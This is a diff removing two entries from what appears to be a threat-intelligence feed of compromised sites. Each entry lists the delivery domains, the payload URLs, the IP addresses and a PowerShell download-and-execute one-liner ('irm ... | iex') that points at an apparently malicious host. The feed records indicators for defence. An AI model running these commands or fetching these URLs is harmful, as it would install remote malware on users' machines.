@@ -3364,43 +3364,5 @@
     ],
     "ReportId": "cmwnpfpw41x2g0oml742g5tyb",
     "ScannedAt": "2026-11-19T15:28:10.392000+00:00"
-  },
-  {
-    "UrlDomain": "fiftyoff.co.za",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
-    ],
-    "IP": [
-      "41.204.202.6"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
-    ],
-    "ReportId": "cmwnlp7zj1wzj0omlkec6jirx",
-    "ScannedAt": "2026-11-19T13:43:35.418000+00:00"
-  },
-  {
-    "UrlDomain": "new.srdvrbas.ba",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
-    ],
-    "IP": [
-      "65.21.234.24"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8ef4c7e148048fda')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
-    ],
-    "ReportId": "cmwnlotyh1wyr0omlqyh8e3xl",
-    "ScannedAt": "2026-11-19T13:43:17.240000+00:00"
   }
 ]
